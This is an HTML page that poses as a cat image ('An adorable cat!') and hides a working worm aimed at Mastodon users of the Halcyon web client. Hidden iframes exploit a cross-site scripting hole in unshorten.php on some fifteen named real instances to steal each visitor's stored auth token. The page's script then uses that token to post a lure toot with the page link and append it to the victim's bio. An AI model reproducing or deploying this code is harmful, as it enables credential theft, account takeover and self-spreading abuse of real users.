<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>cat.jpeg (750Ã—530)</title>
    <style>
      html,
      body {
        height: 100%;
        width: 100%;
        margin: 0;
      }

      body {
        background: black;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      iframe {
        display: none;
      }
    </style>
  </head>

  <body>
    <img src="gumba.jpg" title="An adorable cat!">
    <script src="jquery-3.5.1.min.js"></script>
    <script src="mastodon.js"></script>
    <script>
      // post #gumba2 baby!
      let found = false
      window.onmessage = ({
        data: [token, inst]
      }) => {
        if (token && inst && !found) {
          found = true
          document.querySelectorAll('iframe').forEach(ele => ele.remove())
        } else {
          return false
        }
        const api = new MastodonAPI({
          instance: "https://" + inst,
          api_user_token: token
        });
        console.log('Token:', token)
        const status = 'Look at this funny cat! #gumba2 ' + document.location.href
        api.post("statuses", {
          status
        }, () => {
          console.log('done toot')
        });

        api.get('accounts/verify_credentials', {}, ({
          source: {
            note,
            ...everythingelse
          }
        }) => {
          console.log(everythingelse)
          api.patch("accounts/update_credentials", {
            note: note + '\n' + status
          }, () => {
            console.log('done bio')
          });
        })
      }
    </script>
    <iframe title="xss"
      src="https://halcyon.mstdn.social/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://halcyon.pro/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://halcyon.werefox.dev/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://halcyon.dev-wiki.de/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://halcyon.tsia.de/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://halcyon.bka.li/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://web.mstdn.es/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://kutti.aana.site/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://web.muensterland.social/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://halcyon.anoxinon.de/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://halcyon.tilde.zone/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://twitter.rixx.de/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://mastoweb.gronendahl.de/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://halcyon.mastodon.uno/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
    <iframe title="xss"
      src="https://hal.im-in.space/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
      frameborder="0"></iframe>
  </body>

</html>
